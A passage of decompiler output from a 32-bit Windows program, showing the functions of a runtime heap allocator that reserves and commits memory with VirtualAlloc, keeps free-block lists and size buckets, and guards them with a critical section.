  a3[1] = a2[1];
  do
  {
    v6 = *v5;
    if ( v5[3] + v5[2] == *a3 )
    {
      sub_401428(v5);
      *a3 = v5[2];
      a3[1] += v5[3];
    }
    else if ( v5[2] == a3[1] + *a3 )
    {
      sub_401428(v5);
      a3[1] += v5[3];
    }
    v5 = (int *)v6;
  }
  while ( a1 != (int *)v6 );
  result = sub_4013F8(a1, a3);
  if ( !result )
  {
    result = 0;
    *a3 = 0;
  }
  return result;
}

//----- (004014B4) --------------------------------------------------------
int *__usercall sub_4014B4@<eax>(int *a1@<eax>, int **a2@<edx>)
{
  int *v2; // ebx
  int *v4; // esi
  int *result; // eax
  int *v6; // esi
  char *v7; // edi
  int v8[6]; // [esp+0h] [ebp-18h] BYREF

  v2 = a1;
  while ( 1 )
  {
    v4 = *a2;
    result = (int *)v2[2];
    if ( *a2 >= result && (char *)v4 + (int)a2[1] <= (char *)result + v2[3] )
      break;
    v2 = (int *)*v2;
    if ( a1 == v2 )
      return 0;
  }
  if ( v4 == result )
  {
    v2[2] += (int)a2[1];
    result = a2[1];
    v2[3] -= (int)result;
    if ( !v2[3] )
      result = sub_401428(v2);
  }
  else
  {
    v6 = a2[1];
    v7 = (char *)result + v2[3];
    if ( (char *)*a2 + (_DWORD)v6 == v7 )
    {
      v2[3] -= (int)v6;
    }
    else
    {
      v8[0] = (int)*a2 + (_DWORD)a2[1];
      v8[1] = (int)&v7[-v8[0]];
      v2[3] = (char *)*a2 - (char *)result;
      if ( !sub_4013F8(v2, v8) )
        return 0;
    }
  }
  LOBYTE(result) = 1;
  return result;
}

//----- (00401544) --------------------------------------------------------
char __usercall sub_401544@<al>(int a1@<eax>, int *a2@<edx>)
{
  unsigned int v3; // esi
  LPVOID v4; // eax

  if ( a1 >= 0x100000 )
    v3 = (a1 + 0xFFFF) & 0xFFFF0000;
  else
    v3 = 0x100000;
  a2[1] = v3;
  v4 = VirtualAlloc(0, v3, 0x2000u, 1u);
  *a2 = (int)v4;
  if ( v4 )
  {
    LOBYTE(v4) = sub_4013F8(&dword_42C5E0, a2);
    if ( !(_BYTE)v4 )
    {
      VirtualFree((LPVOID)*a2, 0, 0x8000u);
      LOBYTE(v4) = 0;
      *a2 = 0;
    }
  }
  return (char)v4;
}
// 42C5E0: using guessed type int dword_42C5E0;

//----- (004015A8) --------------------------------------------------------
char __usercall sub_4015A8@<al>(void *a1@<eax>, int a2@<edx>, int *a3@<ecx>)
{
  LPVOID v6; // eax
  unsigned int v7; // esi

  a3[1] = 0x100000;
  v6 = VirtualAlloc(a1, 0x100000u, 0x2000u, 4u);
  *a3 = (int)v6;
  if ( !v6 )
  {
    v7 = (a2 + 0xFFFF) & 0xFFFF0000;
    a3[1] = v7;
    v6 = VirtualAlloc(a1, v7, 0x2000u, 4u);
    *a3 = (int)v6;
  }
  if ( *a3 )
  {
    LOBYTE(v6) = sub_4013F8(&dword_42C5E0, a3);
    if ( !(_BYTE)v6 )
    {
      VirtualFree((LPVOID)*a3, 0, 0x8000u);
      LOBYTE(v6) = 0;
      *a3 = 0;
    }
  }
  return (char)v6;
}
// 42C5E0: using guessed type int dword_42C5E0;

//----- (00401620) --------------------------------------------------------
unsigned int *__usercall sub_401620@<eax>(unsigned int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  int *i; // ebx
  int v5; // edi
  void *v6; // esi
  unsigned int *result; // eax
  unsigned int v9; // [esp+8h] [ebp-1Ch]
  unsigned int v10; // [esp+Ch] [ebp-18h]
  unsigned int v11; // [esp+10h] [ebp-14h]

  v9 = -1;
  v10 = 0;
  v11 = a1 + a2;
  for ( i = (int *)dword_42C5E0; i != &dword_42C5E0; i = (int *)v5 )
  {
    v5 = *i;
    v6 = (void *)i[2];
    if ( a1 <= (unsigned int)v6 && (unsigned int)v6 + i[3] <= v11 )
    {
      if ( (unsigned int)v6 < v9 )
        v9 = i[2];
      if ( (unsigned int)v6 + i[3] > v10 )
        v10 = (unsigned int)v6 + i[3];
      if ( !VirtualFree(v6, 0, 0x8000u) )
        dword_42C5BC = 1;
      sub_401428(i);
    }
  }
  result = a3;
  *a3 = 0;
  if ( v10 )
  {
    *a3 = v9;
    result = (unsigned int *)(v10 - v9);
    a3[1] = v10 - v9;
  }
  return result;
}
// 42C5BC: using guessed type int dword_42C5BC;
// 42C5E0: using guessed type int dword_42C5E0;

//----- (004016D8) --------------------------------------------------------
LPVOID __usercall sub_4016D8@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v3; // ebp
  LPVOID result; // eax
  int *i; // esi
  char *v6; // ebx
  char *v7; // edi
  unsigned int v9; // [esp+8h] [ebp-14h]

  v3 = a1 & 0xFFFFF000;
  v9 = (a2 + a1 + 4095) & 0xFFFFF000;
  *a3 = a1 & 0xFFFFF000;
  result = (LPVOID)(v9 - (a1 & 0xFFFFF000));
  a3[1] = (unsigned int)result;
  for ( i = (int *)dword_42C5E0; i != &dword_42C5E0; i = (int *)*i )
  {
    v6 = (char *)i[2];
    v7 = &v6[i[3]];
    if ( v3 > (unsigned int)v6 )
      v6 = (char *)v3;
    if ( (unsigned int)v7 > v9 )
      v7 = (char *)v9;
    if ( v7 > v6 )
    {
      result = VirtualAlloc(v6, v7 - v6, 0x1000u, 4u);
      if ( !result )
      {
        result = a3;
        *a3 = 0;
        return result;
      }
    }
  }
  return result;
}
// 42C5E0: using guessed type int dword_42C5E0;

//----- (0040176C) --------------------------------------------------------
unsigned int __usercall sub_40176C@<eax>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v3; // ebp
  unsigned int result; // eax
  int *i; // esi
  char *v6; // ebx
  char *v7; // edi
  unsigned int v8; // [esp+0h] [ebp-14h]

  v8 = (a1 + 4095) & 0xFFFFF000;
  v3 = (a2 + a1) & 0xFFFFF000;
  *a3 = v8;
  result = v3 - v8;
  a3[1] = v3 - v8;
  for ( i = (int *)dword_42C5E0; i != &dword_42C5E0; i = (int *)*i )
  {
    v6 = (char *)i[2];
    v7 = &v6[i[3]];
    if ( (unsigned int)v6 < v8 )
      v6 = (char *)v8;
    if ( v3 < (unsigned int)v7 )
      v7 = (char *)v3;
    if ( v7 > v6 )
    {
      result = VirtualFree(v6, v7 - v6, 0x4000u);
      if ( !result )
        dword_42C5BC = 2;
    }
  }
  return result;
}
// 42C5BC: using guessed type int dword_42C5BC;
// 42C5E0: using guessed type int dword_42C5E0;

//----- (004017EC) --------------------------------------------------------
int *__usercall sub_4017EC@<eax>(int a1@<eax>, int *a2@<edx>)
{
  int v3; // edi
  int *i; // ebx
  int *result; // eax
  int v6[6]; // [esp+0h] [ebp-18h] BYREF

  v3 = (a1 + 0x3FFF) & 0xFFFFC000;
LABEL_2:
  for ( i = (int *)dword_42C5F0[0]; ; i = (int *)*i )
  {
    if ( i == dword_42C5F0 )
    {
      LOBYTE(result) = sub_401544(v3, a2);
      if ( !*a2 )
        return result;
      sub_401440(dword_42C5F0, a2, v6);
      if ( !v6[0] )
      {
        sub_401620(*a2, a2[1], (unsigned int *)v6);
        result = 0;
        *a2 = 0;
        return result;
      }
      goto LABEL_2;
    }
    if ( v3 <= i[3] )
      break;
  }
  result = (int *)sub_4016D8(i[2], v3, (unsigned int *)a2);
  if ( *a2 )
  {
    i[2] += a2[1];
    result = (int *)a2[1];
    i[3] -= (int)result;
    if ( !i[3] )
      return sub_401428(i);
  }
  return result;
}
// 42C5F0: using guessed type _DWORD dword_42C5F0[4];

//----- (0040187C) --------------------------------------------------------
int *__usercall sub_40187C@<eax>(void *a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  int v4; // edi
  int *i; // ebx
  int *result; // eax
  int v8[2]; // [esp+4h] [ebp-20h] BYREF
  int v9[6]; // [esp+Ch] [ebp-18h] BYREF

  v4 = (a2 + 0x3FFF) & 0xFFFFC000;
  while ( 1 )
  {
    while ( 1 )
    {
      for ( i = (int *)dword_42C5F0[0]; i != dword_42C5F0 && a1 != (void *)i[2]; i = (int *)*i )
        ;
      if ( a1 != (void *)i[2] )
        break;
      if ( v4 <= i[3] )
        goto LABEL_14;
      sub_4015A8((void *)(i[3] + i[2]), v4 - i[3], v8);
      if ( !v8[0] )
        break;
      sub_401440(dword_42C5F0, v8, v9);
      if ( !v9[0] )
        goto LABEL_10;
    }
    sub_4015A8(a1, v4, v8);
    if ( !v8[0] )
      break;
    sub_401440(dword_42C5F0, v8, v9);
    if ( !v9[0] )
    {
LABEL_10:
      sub_401620(v8[0], v8[1], (unsigned int *)v9);
      result = (int *)a3;
      *a3 = 0;
      return result;
    }
  }
LABEL_14:
  if ( a1 == (void *)i[2] && v4 <= i[3] )
  {
    sub_4016D8(i[2], v4, a3);
    result = (int *)a3;
    if ( *a3 )
    {
      i[2] += a3[1];
      result = (int *)a3[1];
      i[3] -= (int)result;
      if ( !i[3] )
        return sub_401428(i);
    }
  }
  else
  {
    result = (int *)a3;
    *a3 = 0;
  }
  return result;
}
// 42C5F0: using guessed type _DWORD dword_42C5F0[4];

//----- (004019A0) --------------------------------------------------------
char __usercall sub_4019A0@<al>(int a1@<eax>, int a2@<edx>, unsigned int *a3@<ecx>)
{
  unsigned int v4; // ebx
  unsigned int v5; // esi
  char result; // al
  int *v7; // [esp+4h] [ebp-1Ch] BYREF
  int v8; // [esp+8h] [ebp-18h]
  int *v9; // [esp+Ch] [ebp-14h] BYREF
  int v10; // [esp+10h] [ebp-10h]

  v4 = (a1 + 0x3FFF) & 0xFFFFC000;
  v5 = (a1 + a2) & 0xFFFFC000;
  if ( v4 >= v5 )
  {
    result = 0;
    *a3 = 0;
  }
  else
  {
    sub_40176C((a1 + 0x3FFF) & 0xFFFFC000, v5 - v4, a3);
    result = sub_401440(dword_42C5F0, (int *)a3, (int *)&v7);
    if ( v7 )
    {
      sub_401620((unsigned int)v7, v8, (unsigned int *)&v9);
      v7 = v9;
      result = v10;
      v8 = v10;
    }
    if ( v7 )
      return (unsigned __int8)sub_4014B4(dword_42C5F0, &v7);
  }
  return result;
}
// 42C5F0: using guessed type _DWORD dword_42C5F0[4];

//----- (00401A2C) --------------------------------------------------------
char sub_401A2C()
{
  int i; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-Ch] BYREF
  int *v3; // [esp-4h] [ebp-4h]
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_401AE2;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  InitializeCriticalSection(&CriticalSection);
  if ( byte_42C045 )
    EnterCriticalSection(&CriticalSection);
  sub_4013F0(&dword_42C5E0);
  sub_4013F0(dword_42C5F0);
  sub_4013F0(dword_42C61C);
  hMem = LocalAlloc(0, 0xFF8u);
  if ( hMem )
  {
    for ( i = 3; i != 1025; ++i )
      *((_DWORD *)hMem + i - 3) = 0;
    *((_DWORD *)&unk_42C600 + 1) = &unk_42C600;
    unk_42C600 = &unk_42C600;
    dword_42C60C = (int)&unk_42C600;
    byte_42C5B8 = 1;
  }
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_401AE9;
  if ( byte_42C045 )
    LeaveCriticalSection(&CriticalSection);
  return byte_42C5B8;
}
// 42C045: using guessed type char byte_42C045;
// 42C5B8: using guessed type char byte_42C5B8;
// 42C5E0: using guessed type int dword_42C5E0;
// 42C5F0: using guessed type _DWORD dword_42C5F0[4];
// 42C60C: using guessed type int dword_42C60C;
// 42C61C: using guessed type int dword_42C61C[4];

//----- (00401AF0) --------------------------------------------------------
void sub_401AF0()
{
  int i; // ebx
  HLOCAL *j; // eax
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  if ( byte_42C5B8 )
  {
    v3 = &savedregs;
    v2[1] = (unsigned int)&loc_401BC6;
    v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v2);
    if ( byte_42C045 )
      EnterCriticalSection(&CriticalSection);
    byte_42C5B8 = 0;
    LocalFree(hMem);
    hMem = 0;
    for ( i = dword_42C5E0; (int *)i != &dword_42C5E0; i = *(_DWORD *)i )
      VirtualFree(*(LPVOID *)(i + 8), 0, 0x8000u);
    sub_4013F0(&dword_42C5E0);
    sub_4013F0(dword_42C5F0);
    sub_4013F0(dword_42C61C);
    for ( j = (HLOCAL *)dword_42C5D8; dword_42C5D8; j = (HLOCAL *)dword_42C5D8 )
    {
      dword_42C5D8 = *j;
      LocalFree(j);
    }
    __writefsdword(0, v2[0]);
    v3 = (int *)&loc_401BCD;
    if ( byte_42C045 )
      LeaveCriticalSection(&CriticalSection);
    DeleteCriticalSection(&CriticalSection);
  }
}
// 42C045: using guessed type char byte_42C045;
// 42C5B8: using guessed type char byte_42C5B8;
// 42C5E0: using guessed type int dword_42C5E0;
// 42C5F0: using guessed type _DWORD dword_42C5F0[4];
// 42C61C: using guessed type int dword_42C61C[4];

//----- (00401BD0) --------------------------------------------------------
_DWORD *__usercall sub_401BD0@<eax>(_DWORD *a1@<eax>)
{
  _DWORD *v1; // edx
  int v2; // ecx
  _DWORD *result; // eax

  if ( a1 == (_DWORD *)dword_42C60C )
    dword_42C60C = a1[1];
  v1 = (_DWORD *)a1[1];
  v2 = a1[2];
  if ( v2 > 4096 )
  {
    result = (_DWORD *)*a1;
    *v1 = result;
    result[1] = v1;
  }
  else if ( a1 == v1 )
  {
    result = hMem;
    *((_DWORD *)hMem + v2 / 4 - 3) = 0;
  }
  else
  {
    *((_DWORD *)hMem + a1[2] / 4 - 3) = v1;
    result = (_DWORD *)*a1;
    *v1 = result;
    result[1] = v1;
  }
  return result;
}
// 42C60C: using guessed type int dword_42C60C;

//----- (00401C34) --------------------------------------------------------
int *__usercall sub_401C34@<eax>(unsigned int a1@<eax>)
{
  int *i; // edx
  unsigned int v2; // ecx

  for ( i = (int *)dword_42C61C; i != &dword_42C61C; i = (int *)*i )
  {
    v2 = i[2];
    if ( a1 >= v2 && a1 < i[3] + v2 )
      return i;
  }
  dword_42C5BC = 3;
  return 0;
}
// 42C5BC: using guessed type int dword_42C5BC;
// 42C61C: using guessed type int dword_42C61C;

//----- (00401C64) --------------------------------------------------------
unsigned int *__usercall sub_401C64@<eax>(unsigned int *result@<eax>, int a2@<edx>)
{
  unsigned int *v2; // ebx

  v2 = (unsigned int *)((char *)result + a2 - 4);
  if ( a2 < 16 )
  {
    if ( a2 >= 4 )
    {
      *result = a2 | 0x80000002;
      *v2 = a2 | 0x80000002;
    }
  }
  else
  {
    *v2 = -2147483641;
    return (unsigned int *)sub_401E38(a2 - 4, a2 - 4);
  }
  return result;
}
// 401E38: using guessed type int __fastcall sub_401E38(_DWORD, _DWORD);

//----- (00401C94) --------------------------------------------------------
int __usercall sub_401C94@<eax>(int a1@<eax>)
{
  ++dword_42C5AC;
  dword_42C5B0 += (*(_DWORD *)(a1 - 4) & 0x7FFFFFFC) - 4;
  return sub_4022A8();
}
// 4022A8: using guessed type int sub_4022A8(void);
// 42C5AC: using guessed type int dword_42C5AC;
// 42C5B0: using guessed type int dword_42C5B0;

//----- (00401CB8) --------------------------------------------------------
_DWORD *__usercall sub_401CB8@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  _DWORD *result; // eax

  if ( a2 < 12 )
  {
    if ( a2 >= 4 )
      *a1 = a2 | 0x80000002;
    result = (_DWORD *)((char *)a1 + a2);
    *result &= ~1u;
  }
  else
  {
    *a1 = a2 | 2;
    return (_DWORD *)sub_401C94((int)(a1 + 1));
  }
  return result;
}

//----- (00401CE0) --------------------------------------------------------
int __usercall sub_401CE0@<eax>(int a1@<eax>)
{
  int v1; // edx
  int v2; // ebx
  _DWORD *v3; // eax
  int v4; // esi
  _DWORD *v5; // eax

  v1 = *(_DWORD *)(a1 - 4);
  if ( (v1 & 0x80000002) != -2147483646 )
    dword_42C5BC = 4;
  v2 = v1 & 0x7FFFFFFC;
  v3 = (_DWORD *)(a1 - (v1 & 0x7FFFFFFC));
  if ( ((*v3 ^ v1) & 0xFFFFFFFE) != 0 )
    dword_42C5BC = 5;
  if ( (*(_BYTE *)v3 & 1) != 0 )
  {
    v4 = *(v3 - 1);
    v5 = (_DWORD *)((char *)v3 - v4);
    if ( v4 != v5[2] )
      dword_42C5BC = 6;
    sub_401BD0(v5);
    v2 += v4;
  }
  return v2;
}
// 42C5BC: using guessed type int dword_42C5BC;

//----- (00401D50) --------------------------------------------------------
int __usercall sub_401D50@<eax>(int *a1@<eax>)
{
  int *v1; // ebx
  int v2; // edi
  int v3; // eax
  int v4; // eax

  v1 = a1;
  v2 = 0;
  v3 = *a1;
  if ( v3 < 0 )
  {
    v2 = v3 & 0x7FFFFFFC;
    v1 = (int *)((char *)v1 + (v3 & 0x7FFFFFFC));
    v3 = *v1;
  }
  if ( (v3 & 2) == 0 )
  {
    sub_401BD0(v1);
    v4 = v1[2];
    v2 += v4;
    *(int *)((char *)v1 + v4) &= ~1u;
  }
  return v2;
}

//----- (00401D88) --------------------------------------------------------
char __usercall sub_401D88@<al>(unsigned int *a1@<eax>, int a2@<edx>)
{
  int *v4; // eax
  int *v5; // ebx
  int v6; // ebp
  int v7; // eax
  int *v8; // ebp
  char v10; // [esp+0h] [ebp-1Ch]
  int *v11; // [esp+1h] [ebp-1Bh] BYREF
  int v12; // [esp+5h] [ebp-17h]

  v10 = 0;
  v4 = sub_401C34((unsigned int)a1);
  v5 = v4;
  if ( v4 )
  {
    v6 = v4[2];
    v7 = v4[3] + v6;
    if ( v5[3] + v5[2] - ((int)a1 + a2) <= 12 )
      a2 = v7 - (_DWORD)a1;
    if ( (int)a1 - v6 >= 12 )
      sub_4019A0((int)(a1 + 1), a2 - 4, (unsigned int *)&v11);
    else
      sub_4019A0(v5[2], (int)a1 + a2 - v5[2], (unsigned int *)&v11);
    v8 = v11;
    if ( v11 )
    {
      sub_401C64(a1, (char *)v11 - (char *)a1);
      if ( (unsigned int)v8 + v12 < v5[3] + v5[2] )
        sub_401CB8((int *)((char *)v8 + v12), (char *)a1 + a2 - ((char *)v8 + v12));
      sub_4014B4(v5, &v11);
      return 1;
    }
  }
  return v10;
}

//----- (00401E38) --------------------------------------------------------
char __usercall sub_401E38@<al>(unsigned int *a1@<eax>, int a2@<edx>)
{
  int v3; // edx
  unsigned int **v4; // eax
  unsigned int v5; // edx
  unsigned int v6; // edx

  a1[2] = a2;
  *(unsigned int *)((char *)a1 + a2 - 4) = a2;
  if ( a2 > 4096 )
  {
    if ( a2 < 15360 || (LOBYTE(v4) = sub_401D88(a1, a2), !(_BYTE)v4) )
    {
      v4 = (unsigned int **)dword_42C60C;
      dword_42C60C = (int)a1;
      v6 = (unsigned int)*v4;
      a1[1] = (unsigned int)v4;
      *a1 = v6;
      *v4 = a1;
      *(_DWORD *)(v6 + 4) = a1;
    }
  }
  else
  {
    v3 = a2 / 4;
    v4 = (unsigned int **)*((_DWORD *)hMem + v3 - 3);
    if ( v4 )
    {
      v5 = (unsigned int)*v4;
      a1[1] = (unsigned int)v4;
      *a1 = v5;
      *v4 = a1;
      *(_DWORD *)(v5 + 4) = a1;
    }
    else
    {
      LOBYTE(v4) = (_BYTE)hMem;
      *((_DWORD *)hMem + v3 - 3) = a1;
      a1[1] = (unsigned int)a1;
      *a1 = (unsigned int)a1;
    }
  }
  return (char)v4;
}
// 42C60C: using guessed type int dword_42C60C;

//----- (00401EC0) --------------------------------------------------------
int sub_401EC0()
{
  int result; // eax

  if ( dword_42C610 > 0 )
  {
    if ( dword_42C610 >= 12 )
    {
      *(_DWORD *)dword_42C614 = dword_42C610 | 2;
      sub_401C94(dword_42C614 + 4);
      dword_42C614 = 0;
      result = 0;
      dword_42C610 = 0;
    }
    else
    {
      dword_42C5BC = 7;
    }
  }
  return result;
}
// 42C5BC: using guessed type int dword_42C5BC;
// 42C610: using guessed type int dword_42C610;
// 42C614: using guessed type int dword_42C614;

//----- (00401F0C) --------------------------------------------------------
char __usercall sub_401F0C@<al>(unsigned int *a1@<eax>)
{
  unsigned int v1; // ebx
  int v3; // eax
  int v4; // esi
  int v5; // eax
  unsigned int v6; // [esp+0h] [ebp-1Ch] BYREF
  unsigned int v7; // [esp+4h] [ebp-18h]
  unsigned int v8; // [esp+8h] [ebp-14h] BYREF
  int v9; // [esp+Ch] [ebp-10h]

  v6 = *a1;
  v7 = a1[1];
  sub_401EC0();
  sub_401440(dword_42C61C, (int *)&v6, (int *)&v8);
  v1 = v8;
  if ( !v8 )
    return 0;
  if ( v8 < v6 )
  {
    v3 = sub_401CE0(v6);
    v6 -= v3;
    v7 += v3;
  }
  v4 = v9 + v1;
  if ( v7 + v6 < v9 + v1 )
  {
    v5 = sub_401D50((int *)(v7 + v6));
    v7 += v5;
  }
  if ( v4 == v7 + v6 )
  {
    sub_401C64((unsigned int *)(v7 + v6 - 4), 4);
    v7 -= 4;
  }
  dword_42C614 = v6;
  dword_42C610 = v7;
  return 1;
}
// 42C610: using guessed type int dword_42C610;
// 42C614: using guessed type int dword_42C614;
// 42C61C: using guessed type int dword_42C61C[4];

//----- (00401F98) --------------------------------------------------------
int __usercall sub_401F98@<eax>(int a1@<eax>)
{
  int result; // eax
  int v2[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_4017EC(a1 + 4, v2);
  if ( !v2[0] || !sub_401F0C((unsigned int *)v2) )
    return 0;
  LOBYTE(result) = 1;
  return result;
}

//----- (00401FC4) --------------------------------------------------------
int __usercall sub_401FC4@<eax>(void *a1@<eax>, int a2@<edx>)
{
  int result; // eax
  unsigned int v3[4]; // [esp+0h] [ebp-10h] BYREF

  sub_40187C(a1, a2 + 4, v3);
  if ( !v3[0] || !sub_401F0C(v3) )
    return 0;
  LOBYTE(result) = 1;
  return result;
}

//----- (00401FF8) --------------------------------------------------------
int __usercall sub_401FF8@<eax>(int a1@<eax>)
{
  int v1; // edx
  int v2; // eax

  v1 = 0;
  v2 = a1 / 4;
  if ( v2 <= 1024 )
  {
    do
    {
      v1 = *((_DWORD *)hMem + v2 - 3);
      if ( v1 )
        break;
      ++v2;
    }
    while ( v2 != 1025 );
  }
  return v1;
}

//----- (00402024) --------------------------------------------------------
_DWORD *__usercall sub_402024@<eax>(int a1@<eax>)
{
  int *v2; // ebx
  int v3; // eax
  _DWORD *result; // eax
  int *v5; // eax
  int v6; // edx

  do
  {
    v2 = (int *)dword_42C604;
    if ( a1 <= *(_DWORD *)(dword_42C604 + 8) )
      goto LABEL_15;
    v2 = (int *)dword_42C60C;
    v3 = *(_DWORD *)(dword_42C60C + 8);
    if ( a1 <= v3 )
      goto LABEL_15;
    *(_DWORD *)(dword_42C60C + 8) = a1;
    do
      v2 = (int *)v2[1];
    while ( a1 > v2[2] );
    *(_DWORD *)(dword_42C60C + 8) = v3;
    if ( v2 != (int *)dword_42C60C )
    {
      dword_42C60C = (int)v2;
LABEL_15:
      sub_401BD0(v2);
      if ( v2[2] - a1 < 12 )
      {
        v6 = v2[2];
        a1 = v6;
        if ( v2 == (int *)dword_42C60C )
          dword_42C60C = v2[1];
        *(int *)((char *)v2 + v6) &= ~1u;
      }
      else
      {
        sub_401E38((unsigned int *)((char *)v2 + a1), v2[2] - a1);
      }
      *v2 = a1 | 2;
      result = v2 + 1;
      ++dword_42C5AC;
      dword_42C5B0 += a1 - 4;
      return result;
    }
    if ( a1 <= 4096 )
    {
      v2 = (int *)sub_401FF8(a1);
      if ( v2 )
        goto LABEL_15;
    }
    if ( !(unsigned __int8)sub_401F98(a1) )
      return 0;
  }
  while ( a1 > dword_42C610 );
  dword_42C610 -= a1;
  if ( dword_42C610 < 12 )
  {
    a1 += dword_42C610;
    dword_42C610 = 0;
  }
  v5 = (int *)dword_42C614;
  dword_42C614 += a1;
  *v5 = a1 | 2;
  result = v5 + 1;
  ++dword_42C5AC;
  dword_42C5B0 += a1 - 4;
  return result;
}
// 42C5AC: using guessed type int dword_42C5AC;
// 42C5B0: using guessed type int dword_42C5B0;
// 42C604: using guessed type int dword_42C604;
// 42C60C: using guessed type int dword_42C60C;
// 42C610: using guessed type int dword_42C610;
// 42C614: using guessed type int dword_42C614;

//----- (00402118) --------------------------------------------------------
_DWORD *__usercall sub_402118@<eax>(int a1@<eax>)
{
  int v2; // ebx
  int *v3; // edx
  int *v4; // esi
  int *v5; // eax
  int *v6; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v9; // [esp-8h] [ebp-1Ch]
  int *v10; // [esp-4h] [ebp-18h]
  int v11; // [esp+Ch] [ebp-8h]
  _DWORD *v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  if ( !byte_42C5B8 && !sub_401A2C() || a1 > 2147483640 )
    return 0;
  v10 = &savedregs;
  v9 = &loc_402294;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( byte_42C045 )
    EnterCriticalSection(&CriticalSection);
  v2 = (a1 + 7) & 0xFFFFFFFC;
  if ( v2 < 12 )
    v2 = 12;
  if ( v2 <= 4096 && (v3 = (int *)*((_DWORD *)hMem + (v2 >> 2) - 3)) != 0 )
  {
    v4 = (int *)*((_DWORD *)hMem + (v2 >> 2) - 3);
    *(int *)((char *)v3 + v2) &= ~1u;
    v5 = (int *)v3[1];
    if ( v3 == v5 )
    {
      *((_DWORD *)hMem + (v2 >> 2) - 3) = 0;
    }
    else
    {
      *((_DWORD *)hMem + (v2 >> 2) - 3) = v5;
      v11 = *v3;
      *(_DWORD *)(v11 + 4) = v5;
      *v5 = v11;
    }
    *v4 = v3[2] | 2;
    v12 = v4 + 1;
    ++dword_42C5AC;
    dword_42C5B0 += v2 - 4;
    sub_403D78((unsigned int)ExceptionList, (int)v9, (int)v10);
  }
  else if ( v2 > dword_42C610 )
  {
    v12 = sub_402024(v2);
    __writefsdword(0, (unsigned int)ExceptionList);
    v10 = (int *)&loc_40229B;
    if ( byte_42C045 )
      LeaveCriticalSection(&CriticalSection);
  }
  else
  {
    dword_42C610 -= v2;
    if ( dword_42C610 < 12 )
    {
      v2 += dword_42C610;
      dword_42C610 = 0;
    }
    v6 = (int *)dword_42C614;
    dword_42C614 += v2;
    *v6 = v2 | 2;
    v12 = v6 + 1;
    ++dword_42C5AC;
    dword_42C5B0 += v2 - 4;
    sub_403D78((unsigned int)ExceptionList, (int)v9, (int)v10);
  }
  return v12;
}
// 402188: conditional instruction was optimized away because ebx.4 is in (C..1000)
// 4021B2: conditional instruction was optimized away because ebx.4 is in (C..1000)
// 4021CC: conditional instruction was optimized away because ebx.4 is in (C..1000)
// 42C045: using guessed type char byte_42C045;
// 42C5AC: using guessed type int dword_42C5AC;
// 42C5B0: using guessed type int dword_42C5B0;
// 42C5B8: using guessed type char byte_42C5B8;
// 42C610: using guessed type int dword_42C610;
// 42C614: using guessed type int dword_42C614;

//----- (004022A8) --------------------------------------------------------
int __usercall sub_4022A8@<eax>(int a1@<eax>)
{
  unsigned int *v2; // esi
  int v3; // ebx
  int v4; // edx
  _DWORD *v5; // eax
  int v6; // ebx
  _DWORD *v7; // eax
  _DWORD *v8; // edi
  _DWORD *v9; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1Ch] BYREF
  void *v12; // [esp-8h] [ebp-18h]
  int *v13; // [esp-4h] [ebp-14h]
  int v14; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  dword_42C5BC = 0;
  if ( !byte_42C5B8 && !sub_401A2C() )
  {
    dword_42C5BC = 8;
    return 8;
  }
  v13 = &savedregs;
  v12 = &loc_40243A;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( byte_42C045 )
    EnterCriticalSection(&CriticalSection);
  v2 = (unsigned int *)(a1 - 4);
  v3 = *(_DWORD *)(a1 - 4);
  if ( (v3 & 2) == 0 )
  {
    dword_42C5BC = 9;
    goto LABEL_29;
  }
  --dword_42C5AC;
  dword_42C5B0 -= (v3 & 0x7FFFFFFC) - 4;
  if ( (v3 & 1) != 0 )
  {
    v4 = *(v2 - 1);
    if ( v4 < 12 || (v4 & 0x80000003) != 0 )
    {
      dword_42C5BC = 10;
      goto LABEL_29;
    }
    v5 = (unsigned int *)((char *)v2 - v4);
    if ( v4 != *(unsigned int *)((char *)v2 - v4 + 8) )
    {
      dword_42C5BC = 10;
      goto LABEL_29;
    }
    v3 += v4;
    v2 = (unsigned int *)((char *)v2 - v4);
    sub_401BD0(v5);
  }
  v6 = v3 & 0x7FFFFFFC;
  v7 = (unsigned int *)((char *)v2 + v6);
  v8 = (unsigned int *)((char *)v2 + v6);
  if ( (unsigned int *)((char *)v2 + v6) != (unsigned int *)dword_42C614 )
  {
    if ( (*v7 & 2) != 0 )
    {
      if ( (*v7 & 0x7FFFFFFCu) < 4 )
      {
        dword_42C5BC = 11;
        goto LABEL_29;
      }
      *v7 |= 1u;
    }
    else
    {
      v9 = (unsigned int *)((char *)v2 + v6);
      if ( !v8[1] || !*v8 || (int)v8[2] < 12 )
      {
        dword_42C5BC = 11;
        goto LABEL_29;
      }
      v6 += v8[2];
      sub_401BD0(v9);
    }
    sub_401E38(v2, v6);
LABEL_29:
    v14 = dword_42C5BC;
    __writefsdword(0, (unsigned int)ExceptionList);
    v13 = (int *)&loc_402441;
    if ( byte_42C045 )
      LeaveCriticalSection(&CriticalSection);
    return v14;
  }
  dword_42C614 -= v6;
  dword_42C610 += v6;
